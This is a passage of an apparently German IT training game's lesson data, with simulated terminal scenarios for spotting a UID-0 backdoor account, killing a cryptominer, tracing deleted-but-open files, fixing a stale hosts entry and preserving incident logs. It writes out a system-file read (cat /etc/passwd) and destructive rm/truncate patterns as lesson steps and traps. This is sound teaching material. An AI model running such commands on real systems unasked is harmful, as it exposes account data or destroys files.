║                                                              ║
║  Das Symbol: |                                               ║
║  Leitet Output von einem Befehl zum nächsten.                ║
║  Wie Wasserleitungen für Daten.                              ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Die User-Datenbank wurde kompromittiert.

In /etc/passwd stehen 847 Benutzer. Einer davon heißt "malware".

Der Angreifer hat einen Fake-Account angelegt!

**Deine Aufgabe:**
- \`cat /etc/passwd | grep malware\` — Finde den Fake-Account
- \`cat /etc/passwd | wc -l\` — Zähle alle User
- Kombiniere Befehle mit der Pipe |`,
    mentorNote: 'Die Pipe | ist das Herzstück von Unix. Kleine Programme, eine Sache gut, kombinierbar.',
    choices: [
      {
        id: 'start',
        text: 'Den Fake-Account aufspüren...',
        effects: { skills: { linux: 5, security: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  PIPE-MEISTER FREIGESCHALTET                                 ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  MALWARE-ACCOUNT GEFUNDEN:                                   ║
║  User: malware                                               ║
║  UID: 0 (ROOT-RECHTE!)                                       ║
║  Shell: /bin/bash                                            ║
║                                                              ║
║  STATUS: BACKDOOR AKTIV                                      ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der Account "malware" hat UID 0 — ROOT-RECHTE!

Das ist eine Backdoor. Der Angreifer kann jederzeit zurückkommen.

Zeit die Prozesse zu checken...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'azubi',
      currentPath: '/etc',
      commands: [
        {
          pattern: 'cat /etc/passwd',
          output: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[... 840 weitere Zeilen ...]
azubi:x:1000:1000:Azubi:/home/azubi:/bin/bash
malware:x:0:0:System Service:/tmp:/bin/bash
[... weitere Zeilen ...]

# 847 User?! Das scrollt ewig. Du brauchst Pipes!`,
          wrongApproachFeedback: 'Zu viele Zeilen! Nutze | grep um zu filtern.',
          skillGain: { linux: 1 },
        },
        {
          pattern: 'cat /etc/passwd | grep malware',
          output: `malware:x:0:0:System Service:/tmp:/bin/bash

# GEFUNDEN! UID 0 = Root-Rechte! Das ist eine Backdoor!`,
          teachesCommand: 'pipe',
          skillGain: { linux: 3, security: 3 },
          isSolution: true,
        },
        {
          pattern: 'grep malware /etc/passwd',
          output: `malware:x:0:0:System Service:/tmp:/bin/bash

# Das geht auch direkt. Aber Pipes sind mächtiger für Kombis!`,
          skillGain: { linux: 2, security: 2 },
          isSolution: true,
        },
        {
          pattern: 'cat /etc/passwd | wc -l',
          output: `847

# 847 User im System. Einer davon ist fake...`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'cat /etc/passwd | grep ":0:" | grep -v root',
          output: `malware:x:0:0:System Service:/tmp:/bin/bash

# Wer hat noch UID 0 außer root? Da ist der Eindringling!`,
          skillGain: { linux: 4, security: 4 },
        },
        {
          pattern: 'cat /etc/passwd | grep bash',
          output: `root:x:0:0:root:/root:/bin/bash
azubi:x:1000:1000:Azubi:/home/azubi:/bin/bash
malware:x:0:0:System Service:/tmp:/bin/bash

# Nur 3 User haben bash-Zugang. Einer davon ist verdächtig.`,
          skillGain: { linux: 3 },
        },
      ],
      solutions: [
        {
          commands: ['|', 'malware'],
          allRequired: false,
          resultText: 'Backdoor-Account identifiziert! Der Angreifer hat Root-Rechte eingerichtet.',
          skillGain: { linux: 6, security: 5, troubleshooting: 3 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "Die Pipe | leitet Output weiter. Wie: befehl1 | befehl2"',
        '🤖 Jens: "cat datei | grep muster — erst lesen, dann filtern."',
        '🤖 Jens: "wc -l zählt Zeilen. cat /etc/passwd | wc -l = Anzahl User"',
        '🤖 Jens: "Such mal nach malware. Der Name ist... auffällig, oder?"',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level2', 'pipes', 'story'],
  },

  {
    id: 'learn_06_zombie_hunt',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_05_pipe_filter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Linux & Services 2: Die Zombie-Jagd',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  SYSTEM-ALARM                                            ║
║                                                              ║
║  CPU: [████████████████████████████████████░░] 99%           ║
║  RAM: [████████████████████░░░░░░░░░░░░░░░░░░] 67%           ║
║  FAN: ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░  (SPINNING INTENSIFIES)           ║
║                                                              ║
║  WARNUNG: Unbekannter Prozess verbraucht Ressourcen!        ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der Server glüht! Die Lüfter drehen durch!

Irgendein Prozess frisst 99% CPU. Das riecht nach Cryptominer.

Zeit für eine Zombie-Jagd.

**Deine Aufgabe:**
- \`ps aux\` — Zeige alle Prozesse
- \`ps aux | grep -v root | head\` — Filtere und limitiere
- Finde den Prozess der die CPU auffrisst
- Beende ihn mit \`kill\``,
    mentorNote: 'ps aux zeigt alle Prozesse. %CPU Spalte beachten. kill PID beendet Prozesse.',
    choices: [
      {
        id: 'start',
        text: 'Zombie-Jagd starten...',
        effects: { skills: { linux: 5, troubleshooting: 4 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 ZOMBIE ELIMINIERT                                        ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  Prozess: miner.sh (PID 6666)                                ║
║  Status: TERMINATED                                          ║
║                                                              ║
║  CPU: [████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] 12%           ║
║  FAN: ░░░░░░░░░░░░░░░░░░  (leise)                            ║
║                                                              ║
║  Der Server atmet wieder.                                    ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Cryptominer eliminiert! Der Angreifer hat Bitcoin auf deinem Server geschürft.

Jetzt müssen wir die Dienste kontrollieren...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'root',
      currentPath: '~',
      commands: [
        {
          pattern: 'ps aux',
          output: `USER       PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root         1  0.0  0.1  12345  6789 ?    Ss   08:00   0:01 /sbin/init
root       234  0.1  0.5  98765 12345 ?    S    08:00   0:05 /usr/sbin/sshd
www-data   567  0.5  2.0 234567 12345 ?    S    08:00   0:15 /usr/sbin/apache2
mysql      890  1.2  4.0 567890 45678 ?    Sl   08:00   0:45 /usr/sbin/mysqld
malware   6666 99.0  8.0 999999 88888 ?    R    02:48  47:23 /tmp/.hidden/miner.sh
root      7890  0.0  0.1  12345  2345 pts/0 R+   10:00   0:00 ps aux

# PID 6666 mit 99% CPU?! Das ist der Cryptominer!`,
          teachesCommand: 'ps',
          skillGain: { linux: 3 },
        },
        {
          pattern: 'ps aux | grep miner',
          output: `malware   6666 99.0  8.0 999999 88888 ?    R    02:48  47:23 /tmp/.hidden/miner.sh
root      7891  0.0  0.0  12345   987 pts/0 S+   10:00   0:00 grep miner

# Der Prozess läuft unter User "malware" - der Backdoor-Account!`,
          skillGain: { linux: 3, security: 2 },
          isSolution: true,
        },
        {
          pattern: 'top',
          output: `top - 10:15:00 up 2:15, 1 user, load average: 15.00, 14.80, 12.50
Tasks: 120 total, 2 running
%Cpu(s): 99.0 us, 1.0 sy, 0.0 ni, 0.0 id

  PID USER      %CPU %MEM    TIME+ COMMAND
 6666 malware   99.0  8.0  47:23.45 miner.sh          # <-- DA!
  890 mysql      1.2  4.0   0:45.12 mysqld
  567 www-data   0.5  2.0   0:15.00 apache2

# Drücke q zum Beenden

# 99% CPU! Der Miner muss sterben!`,
          teachesCommand: 'top',
          skillGain: { linux: 3 },
        },
        {
          pattern: 'kill 6666',
          output: `# Prozess 6666 beendet.

[SYSTEM] CPU-Last fällt von 99% auf 12%.
[SYSTEM] Lüfter-Drehzahl normalisiert.
[SYSTEM] Der Server atmet wieder.`,
          teachesCommand: 'kill',
          skillGain: { linux: 4, troubleshooting: 3 },
          isSolution: true,
        },
        {
          pattern: 'kill -9 6666',
          output: `# Prozess 6666 BRUTAL beendet (SIGKILL).

[SYSTEM] CPU-Last fällt von 99% auf 12%.
[SYSTEM] Der Zombie ist tot. Endgültig.`,
          skillGain: { linux: 3 },
        },
        {
          pattern: 'killall miner.sh',
          output: `# Alle Prozesse namens "miner.sh" beendet.

[SYSTEM] Cryptominer eliminiert.`,
          skillGain: { linux: 2 },
        },
      ],
      solutions: [
        {
          commands: ['ps', 'kill'],
          allRequired: true,
          resultText: 'Cryptominer eliminiert! Der Server ist wieder unter Kontrolle.',
          skillGain: { linux: 6, troubleshooting: 6, security: 3 },
          effects: { stress: -10 },
        },
      ],
      hints: [
        '🤖 Jens: "ps aux zeigt alle Prozesse. Such nach dem CPU-Fresser."',
        '🤖 Jens: "Die %CPU Spalte zeigt wer schuld ist. 99% ist nicht normal."',
        '🤖 Jens: "Gefunden? kill PID beendet den Prozess. Die PID steht in der 2. Spalte."',
        '🤖 Jens: "Wenn kill nicht reicht: kill -9 PID ist der Holzhammer. SIGKILL."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level3', 'processes', 'story'],
  },

  // ----------------------------------------------------------------
  // ADVANCED (optional, unlocks after Lektion 6). Thematic sequel: L6 was a
  // VISIBLE CPU hog; this is an INVISIBLE disk hog — a deleted-but-still-open
  // file handle. Multi-step win: diagnose (lsof +L1) AND fix (restart the
  // holding service). No "Lektion N" number, so it reads as a bonus and
  // doesn't renumber the curriculum. Surfaces via the engine's interleaving
  // once learn_06 is done.
  // ----------------------------------------------------------------
  {
    id: 'learn_adv_phantom_storage',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_06_zombie_hunt'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Linux & Services ★: Der unsichtbare Speicherfresser',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  DISK-ALARM — warm-srv-log01                             ║
║                                                              ║
║  /  [████████████████████████████████████████] 100%  0 B frei║
║                                                              ║
║  rsyslog: kann nicht schreiben (No space left on device)     ║
║  Monitoring: Log-Eingang gestoppt                            ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der zentrale Log-Server ist voll. Komplett. Keine Bytes mehr frei.

Du fängst an aufzuräumen … aber die Logs unter \`/var/log\` sind gar nicht so groß. Du rechnest zusammen — und kommst nicht mal annähernd auf die belegte Menge. Der Platz ist weg, aber **du findest ihn nicht**.

Irgendwo hält etwas die Platte fest. Du musst herausfinden, *wer* — und ihn dazu bringen, loszulassen.

**Deine Aufgabe:**
- \`df -h\` — wie voll ist die Platte wirklich?
- \`du -sh /var/log/*\` — wo steckt der Platz? (rechne nach …)
- Finde heraus, *wer* den Speicher in Wirklichkeit festhält — und gib ihn frei.`,
    mentorNote:
      'Eine gelöschte Datei, die ein Prozess noch offen hält, gibt ihren Speicher erst frei, wenn der Prozess sie schließt. df zählt die belegten Blöcke weiter, du findet die Datei nicht mehr — ihr Verzeichniseintrag ist schon weg. Der saubere Fix ist NICHT noch mehr löschen, sondern den haltenden Dienst gezielt neu zu starten.',
    choices: [
      {
        id: 'start',
        text: 'Speicher-Mysterium untersuchen...',
        effects: { skills: { linux: 5, troubleshooting: 5 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 SPEICHER ZURÜCK                                          ║
║                                                              ║
║  Übeltäter: rsyslogd (PID 812)                               ║
║  hielt: /var/log/warm-debug.log (gelöscht) ≈ 42 GB           ║
║                                                              ║
║  /  [██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] 13%  43 G frei║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Klassiker gelöst! Jemand hatte vor Wochen Debug-Logging angeschaltet. logrotate hat die 42-GB-Datei zwar gelöscht — aber rsyslogd hielt den Dateihandle offen weiter. Der Platz blieb belegt, ohne dass eine Datei zu sehen war.

Ein gezielter Neustart des Dienstes hat den Handle geschlossen — und 42 GB sind sofort zurück. Kein Reboot, kein Datenverlust.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-log01',
      username: 'root',
      currentPath: '/var/log',
      commands: [
        {
          pattern: 'df -h',
          patternRegex: '^df',
          output: `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   50G     0 100% /
tmpfs           3.9G     0  3.9G   0% /dev/shm

# 100% voll, 0 frei. Aber wo sind die 50 GB hin?`,
          teachesCommand: 'df',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'du -sh /var/log/*',
          patternRegex: '^du',
          output: `1.2G	/var/log/journal
220M	/var/log/nginx
84M	/var/log/syslog
12M	/var/log/auth.log
6.0M	/var/log/dpkg.log

# Summe /var/log ≈ 1.6 GB. Selbst die ganze Platte bringt per du nur
# ~7 GB zusammen. Wo sind die fehlenden ~42 GB?!`,
          teachesCommand: 'du',
          skillGain: { linux: 2, troubleshooting: 2 },
        },
        {
          pattern: 'ls -lh',
          patternRegex: '^ls\\b',
          output: `insgesamt 1,6G
drwxr-xr-x  2 root    root   4,0K Jun 22 03:00 journal
-rw-r-----  1 syslog  adm      84M Jun 22 09:14 syslog
-rw-r-----  1 syslog  adm      12M Jun 22 09:14 auth.log
-rw-r--r--  1 root    root    6,0M Jun 20 06:25 dpkg.log

# Sieht völlig normal aus. Keine Riesen-Datei in Sicht — genau das ist
# der Hinweis: die Datei steht nicht mehr im Verzeichnis.`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'lsof +L1',
          patternRegex: 'lsof\\s*\\+L1|lsof[^|]*\\|\\s*grep\\s+deleted|lsof[^|]*deleted',
          output: `COMMAND   PID  USER  FD   TYPE DEVICE   SIZE/OFF NLINK   NODE NAME
rsyslogd  812  root   7w   REG    8,1 45097156608     0 393219 /var/log/warm-debug.log (deleted)
nginx    1455 www-d   3w   REG    8,1    2097152     1 131074 /var/log/nginx/access.log

# DA! rsyslogd (PID 812) hält /var/log/warm-debug.log offen — NLINK 0
# heißt gelöscht, aber der Handle lebt. SIZE/OFF ≈ 42 GB. Solange der
# Prozess die Datei offen hält, gibt das System den Platz nicht frei.`,
          teachesCommand: 'lsof-deleted',
          skillGain: { linux: 4, troubleshooting: 3, security: 1 },
        },
        {
          pattern: 'lsof',
          patternRegex: '^lsof\\s*$',
          output: `COMMAND   PID  USER  FD   TYPE DEVICE SIZE/OFF   NODE NAME
init        1  root  cwd   DIR    8,1     4096      2 /
sshd      234  root  mem   REG    8,1   166008    ... /usr/sbin/sshd
... (mehrere tausend Zeilen) ...

# Viel zu viel auf einmal. Du suchst eine GELÖSCHTE, noch offene Datei —
# dafür gibt es einen Filter für Link-Count 0.`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'systemctl restart rsyslog',
          patternRegex: 'systemctl\\s+restart\\s+rsyslog|service\\s+rsyslog\\s+restart|systemctl\\s+restart\\s+syslog',
          output: `[ ok ] Restarting rsyslog ...
rsyslog.service: gestoppt (Dateihandle geschlossen)
rsyslog.service: gestartet

# Dienst neu gestartet — der offene Handle ist weg. Prüf den Platz:
# df -h zeigt jetzt 43 G frei. Der Speicher ist zurück.`,
          teachesCommand: 'restart-service',
          skillGain: { linux: 4, troubleshooting: 4 },
        },
        {
          pattern: 'systemctl restart nginx',
          patternRegex: 'systemctl\\s+restart\\s+(nginx|apache2|mysql|ssh)|service\\s+(nginx|apache2|mysql)\\s+restart',
          output: `[ ok ] Dienst neu gestartet.

# Läuft wieder — aber df zeigt weiter 100%. Das war nicht der Prozess,
# der die gelöschte Datei festhält. Schau nochmal genau hin, WER den
# Handle offen hat.`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'rm',
          patternRegex: '^rm\\b|truncate|:\\s*>\\s*/var',
          output: `# Du löschst noch mehr Dateien — aber die 42 GB bleiben belegt. Die
# Datei ist längst gelöscht; ihr Platz hängt am offenen Handle, nicht
# am Verzeichnis. Mehr löschen hilft hier NICHT.`,
          wrongApproachFeedback:
            'Mehr löschen bringt den Platz nicht zurück — er hängt an einem offenen Handle, nicht an einer sichtbaren Datei.',
          skillGain: {},
        },
        {
          pattern: 'reboot',
          patternRegex: '^reboot|shutdown\\s+-r',
          output: `# Ein Reboot würde den Platz freigeben (alle Handles sterben) — aber das
# nimmt den KRITIS-Log-Server für Minuten vom Netz und reißt alle anderen
# Dienste mit. Es geht gezielter: nur den einen Dienst neu starten.`,
          skillGain: { linux: 1 },
        },
      ],
      solutions: [
        {
          commands: ['lsof-deleted', 'restart-service'],
          allRequired: true,
          resultText:
            'Sauber diagnostiziert und gezielt behoben: rsyslogd hielt eine gelöschte 42-GB-Debug-Log offen — lsof +L1 hat den Handle sichtbar gemacht, der Dienst-Neustart hat ihn geschlossen. 43 GB sofort zurück, ohne Reboot.',
          skillGain: { linux: 6, troubleshooting: 6 },
          effects: { stress: -8 },
        },
      ],
      hints: [
        '🤖 Jens: "df sagt voll, du findest den Platz nicht? Dann liegt er nicht mehr im Dateisystem — er hängt noch woanders fest."',
        '🤖 Jens: "Eine gelöschte Datei, die ein Prozess noch offen hält, belegt weiter Platz. Es gibt ein Tool, das offene Dateien auflistet."',
        '🤖 Jens: "lsof +L1 zeigt offene Dateien mit Link-Count 0 — gelöscht, aber noch offen. Da steht der Übeltäter samt PID und Dienst."',
        '🤖 Jens: "Den Platz gibt erst der haltende Prozess frei. Starte gezielt SEINEN Dienst neu (systemctl restart …) — kein Reboot, kein rm."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'advanced', 'troubleshooting', 'disk', 'forensics'],
  },

  // ----------------------------------------------------------------
  // ADVANCED (optional, unlocks after Lektion 8 / Netzwerk). DNS split-brain
  // with a LOCAL twist: dig says the right IP, but curl hits the wrong one —
  // because /etc/hosts is consulted before the DNS server (and nscd cached it).
  // Multi-step win: remove the stale override AND flush the local cache. The
  // fix stays host-local (no nsupdate/rndc), so it fits one CLI lesson.
  // ----------------------------------------------------------------
  {
    id: 'learn_adv_dns_splitbrain',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_08_network_recon'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Netzwerk & DNS ★: Der Name, der lügt',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  TICKET #4471 — warm-app-02                              ║
║                                                              ║
║  "portal.kritis.local zeigt die ALTE Oberfläche / falsche    ║
║   Daten. Andere Kollegen sehen die neue Version. Bei mir     ║
║   nicht. Neustart hat nichts gebracht."                      ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Das interne Portal wurde letzte Woche auf einen neuen Server umgezogen. Die meisten sehen die neue Version — von **diesem** Host aus landest du aber immer noch beim alten Backend.

Komisch: Das Netzwerk ist ok, der DNS-Server kennt die neue IP. Trotzdem geht der Zugriff woanders hin. *Irgendwas zwischen dem Namen und der DNS-Abfrage trickst dich aus.*

**Deine Aufgabe:**
- \`curl portal.kritis.local\` — wo landest du wirklich?
- \`dig portal.kritis.local\` — was sagt der DNS-Server?
- Finde heraus, warum dieser Host den Namen anders auflöst als der DNS — und korrigier es.`,
    mentorNote:
      'Namensauflösung läuft über nsswitch (/etc/nsswitch.conf): /etc/hosts wird i.d.R. VOR dem DNS-Server befragt. dig fragt nur den DNS-Server (korrekt), getent hosts zeigt das ECHTE Ergebnis der Auflösungskette. Ein veralteter /etc/hosts-Eintrag — oder ein nscd-Cache, der ihn hält — übersteuert den richtigen DNS-Wert. Fix bleibt lokal: Eintrag raus + Cache leeren, nicht am DNS-Server schrauben.',
    choices: [
      {
        id: 'start',
        text: 'Der Namensauflösung auf den Grund gehen...',
        effects: { skills: { netzwerk: 5, troubleshooting: 5 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 NAME ENTLARVT                                            ║
║                                                              ║
║  DNS sagt:        portal.kritis.local → 10.0.9.20 (neu)      ║
║  /etc/hosts log:  portal.kritis.local → 10.0.5.10 (alt) ✗    ║
║                                                              ║
║  Override entfernt + Cache geleert → curl trifft 10.0.9.20   ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Gelöst! Beim Umzug hatte jemand testweise einen \`/etc/hosts\`-Eintrag auf die alte IP gesetzt — und vergessen, ihn zu entfernen. Der DNS-Server war die ganze Zeit korrekt; nur dieser Host fragte zuerst \`/etc/hosts\` und bekam die alte IP. Nach dem Entfernen (und einem Cache-Flush, weil nscd den Eintrag noch hielt) landet \`curl\` wieder beim richtigen Backend.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-app-02',
      username: 'root',
      currentPath: '~',
      commands: [
        {
          pattern: 'curl portal.kritis.local',
          patternRegex: '(curl|wget).*portal',
          output: `*   Trying 10.0.5.10:80...
* Connected to portal.kritis.local (10.0.5.10) port 80
< HTTP/1.1 200 OK
< X-Backend: portal-legacy-v1  (ABGEKÜNDIGT)
< X-Server: web-old-03

# Du landest auf 10.0.5.10 — dem ALTEN Backend. Aber der Umzug ging
# doch auf einen neuen Server? Wer schickt dich auf die alte IP?`,
          teachesCommand: 'curl',
          skillGain: { netzwerk: 2, troubleshooting: 2 },
        },
        {
          pattern: 'dig portal.kritis.local',
          patternRegex: '(dig|nslookup|host)\\s+portal',
          output: `;; ANSWER SECTION:
portal.kritis.local.   300   IN   A   10.0.9.20

;; SERVER: 10.0.0.53#53(10.0.0.53)

# Der DNS-Server sagt 10.0.9.20 (neu) — also völlig korrekt!
# Aber curl ging auf 10.0.5.10. Der DNS ist es NICHT. Das Problem
# sitzt zwischen "Name eintippen" und "DNS fragen" — also lokal.`,
          teachesCommand: 'dig',
          skillGain: { netzwerk: 3, troubleshooting: 2 },
        },
        {
          pattern: 'getent hosts portal.kritis.local',
          patternRegex: 'getent\\s+.*portal',
          output: `10.0.5.10       portal.kritis.local

# DA ist der Beweis: die ECHTE Auflösungskette dieses Hosts gibt
# 10.0.5.10 zurück — anders als dig (10.0.9.20). getent folgt
# nsswitch, also /etc/hosts ZUERST. Da muss ein alter Eintrag liegen.`,
          teachesCommand: 'getent',
          skillGain: { netzwerk: 3, troubleshooting: 3 },
        },
        {
          pattern: 'grep portal /etc/hosts',
          patternRegex: 'grep.*portal.*hosts|cat\\s+/etc/hosts|grep.*hosts.*portal',
          output: `10.0.5.10   portal.kritis.local   # TEST Umzug -- TODO wieder entfernen (mk)

# Gefunden. Ein hartkodierter Override auf die alte IP, als "TEST"
# gesetzt und nie aufgeräumt. Der übersteuert den korrekten DNS-Wert.`,
          teachesCommand: 'find-override',
          skillGain: { netzwerk: 2, security: 1, troubleshooting: 2 },
        },
        {
          pattern: "sed -i '/portal/d' /etc/hosts",
          patternRegex: 'sed.*portal.*/etc/hosts|sed.*/etc/hosts|sed.*hosts.*portal',
          output: `# Zeile entfernt. /etc/hosts enthält keinen portal-Override mehr.
# Achtung: ein laufender Cache (nscd/systemd-resolved) kann den alten
# Wert noch halten — sicherheitshalber den Cache leeren.`,
          teachesCommand: 'remove-override',
          skillGain: { netzwerk: 3, troubleshooting: 3, linux: 2 },
        },
        {
          pattern: 'resolvectl flush-caches',
          patternRegex: 'resolvectl\\s+flush|systemd-resolve\\s+--flush|systemctl\\s+restart\\s+(nscd|systemd-resolved)|nscd\\s+-i|nscd.*invalidate',
          output: `# Lokaler Resolver-Cache geleert.

$ curl -s -o /dev/null -w '%{remote_ip}\\n' portal.kritis.local
10.0.9.20

# Jetzt trifft curl 10.0.9.20 — das neue Backend. Behoben.`,
          teachesCommand: 'flush-cache',
          skillGain: { netzwerk: 3, troubleshooting: 3 },
        },
        {
          pattern: 'nsupdate',
          patternRegex: 'nsupdate|rndc|named|/etc/bind|/etc/resolv.conf',
          output: `# Stopp — der autoritative DNS-Server ist KORREKT (dig zeigt 10.0.9.20).
# Wenn du dort etwas änderst, brichst du die Auflösung für ALLE anderen,
# bei denen es längst funktioniert. Das Problem ist nur auf diesem Host.`,
          wrongApproachFeedback:
            'Finger weg vom DNS-Server — der ist korrekt. Der Fehler sitzt lokal auf diesem Host.',
          skillGain: {},
        },
        {
          pattern: 'systemctl restart nginx',
          patternRegex: 'systemctl\\s+restart\\s+(nginx|apache2|portal|app)',
          output: `# Der Dienst läuft sauber — er bekommt nur die falsche IP aufgelöst.
# Einen Neustart hat der Nutzer laut Ticket schon probiert. Das Problem
# ist die Namensauflösung, nicht die Anwendung.`,
          skillGain: {},
        },
      ],
      solutions: [
        {
          commands: ['remove-override', 'flush-cache'],
          allRequired: true,
          resultText:
            'Sauber eingegrenzt und lokal behoben: dig bewies, dass der DNS korrekt ist, getent/​grep entlarvten den alten /etc/hosts-Override. Eintrag raus, Cache geleert — curl trifft wieder das neue Backend (10.0.9.20). Kein Eingriff am DNS-Server nötig.',
          skillGain: { netzwerk: 6, troubleshooting: 5 },
          effects: { stress: -6 },
        },
      ],
      hints: [
        '🤖 Jens: "curl landet woanders als dig sagt? Dann fragt curl nicht (nur) den DNS-Server. Wo schaut die lokale Namensauflösung ZUERST nach?"',
        '🤖 Jens: "dig fragt den DNS direkt — der ist korrekt. getent hosts portal.kritis.local zeigt, was der Host WIRKLICH auflöst. Vergleich die beiden."',
        '🤖 Jens: "Die Auflösung kommt aus /etc/hosts, nicht vom DNS. grep portal /etc/hosts findet den alten Eintrag."',
        '🤖 Jens: "Eintrag raus (sed -i \'/portal/d\' /etc/hosts) und den lokalen Cache leeren (resolvectl flush-caches bzw. nscd neu starten)."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'advanced', 'netzwerk', 'dns', 'troubleshooting'],
  },

  // ----------------------------------------------------------------
  // ADVANCED (optional, unlocks after Lektion 10 / Incident-Boss). IR
  // DISCIPLINE, not a single technique: "erst sichern, dann reparieren". The
  // evidence is about to rotate away in minutes. The engine can't enforce
  // ORDER on terminal solutions, so the win = PRESERVE (cp the live log off
  // the rotation + a durable journald copy); every remediation (logrotate -f,
  // restart, block, rm) is a "not yet — secure first" trap with feedback.
  // ----------------------------------------------------------------
  {
    id: 'learn_adv_evidence_first',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_10_incident_boss'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Incident Response ★: Erst sichern, dann reparieren',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🚨 INCIDENT LÄUFT — warm-srv-web03                          ║
║                                                              ║
║  Verdächtige sudo-Aktivität von 203.0.113.66 in /var/log/    ║
║  auth.log. Beweise liegen vor.                               ║
║                                                              ║
║  ⏳ logrotate (cron) läuft in ~4 Minuten: rotate 1, compress ║
║     → die aktuelle auth.log wird verdrängt und überschrieben ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du hast den Einbruch in den Logs. Aber die Uhr läuft: in wenigen Minuten rotiert \`logrotate\` die Datei weg — und mit ihr deine Beweise.

Der Reflex ist, sofort zu **reparieren**: Dienst neustarten, IP sperren, Lücke schließen. Genau das ist hier der Fehler. **Erst sichern, dann reparieren.**

**Deine Aufgabe:**
- Verschaff dir einen Überblick (was steht an, was sind die Beweise?).
- Sichere die Beweise an einen Ort **außerhalb der Rotation** — bevor irgendetwas anderes passiert.
- Reparieren kommt DANACH (in dieser Lektion nicht mehr).`,
    mentorNote:
      'Incident-Response-Grundregel: Beweise sichern, BEVOR du reparierst. Logs rotieren, werden komprimiert und gelöscht — wer erst den Dienst neustartet, die IP sperrt oder logrotate laufen lässt, vernichtet oft die Spuren. Sichere die relevante Logdatei an einen Ort außerhalb der Rotation (z.B. /root/incident) UND zieh zusätzlich eine Kopie aus journald — das überlebt die Datei-Rotation. Erst danach eindämmen/reparieren.',
    choices: [
      {
        id: 'start',
        text: 'An die Konsole — Beweise sichern...',
        effects: { skills: { security: 5, troubleshooting: 4 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 BEWEISE GESICHERT                                        ║
║                                                              ║
║  /root/incident/auth.log      (Live-Log, kopiert)           ║
║  /root/incident/ssh.journal   (journald, rotationssicher)   ║
║                                                              ║
║  ⏳ logrotate ist gelaufen — die Originaldatei rotierte,    ║
║     deine Kopien sind unangetastet. ERST JETZT: reparieren. ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Genau so. Du hast die Beweise an einen Ort außerhalb der Rotation kopiert UND eine durable journald-Kopie gezogen, bevor irgendeine Reparatur die Spuren überschreiben konnte. Als logrotate lief, war alles Wichtige längst gesichert. Jetzt — und erst jetzt — geht es ans Eindämmen und Schließen der Lücke.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-web03',
      username: 'root',
      currentPath: '/var/log',
      commands: [
        {
          pattern: 'cat /etc/logrotate.d/rsyslog',
          patternRegex: 'cat\\s+/etc/logrotate|ls\\s+-l.*auth\\.log',
          output: `/var/log/auth.log {
    hourly
    rotate 1
    compress
    missingok
    postrotate ... endscript
}

# rotate 1 = nur EINE alte Version bleibt, der Rest wird gelöscht.
# hourly + der cron-Lauf gleich = die aktuelle auth.log ist in
# Minuten weg. Wenn du sie brauchst, sichere sie JETZT.`,
          teachesCommand: 'check-rotation',
          skillGain: { linux: 2, security: 2 },
        },
        {
          pattern: 'grep 203.0.113.66 /var/log/auth.log',
          patternRegex: 'grep.*203\\.0\\.113\\.66|grep.*sudo.*auth|grep.*auth\\.log',
          output: `Jun 22 09:02:11 warm-srv-web03 sshd[20144]: Accepted password for deploy from 203.0.113.66 port 51022
